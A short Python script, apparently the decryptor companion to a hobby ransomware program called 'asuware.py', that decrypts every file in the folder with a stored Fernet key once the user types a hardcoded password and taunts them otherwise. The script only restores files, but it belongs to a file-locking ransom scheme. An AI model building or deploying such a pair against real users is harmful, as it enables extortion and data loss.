import os
from getpass import getpass
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
    if file == "asuware.py" or file == ".thekey.key" or file == "buka.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

with open(".thekey.key", "rb") as key:
    secretkey = key.read()

kunci = "bismillah"
user_guess = getpass("Masukkan password untuk decrypt file anda! \n")

def decrypt_proceed():
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        try:
            contents_decrypted = Fernet(secretkey).decrypt(contents)
        except:
            print("There's error")
            return
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("Your files are back!")



if user_guess == kunci:
    decrypt_proceed()
else:
    print("Sorry, it's just not your day!")
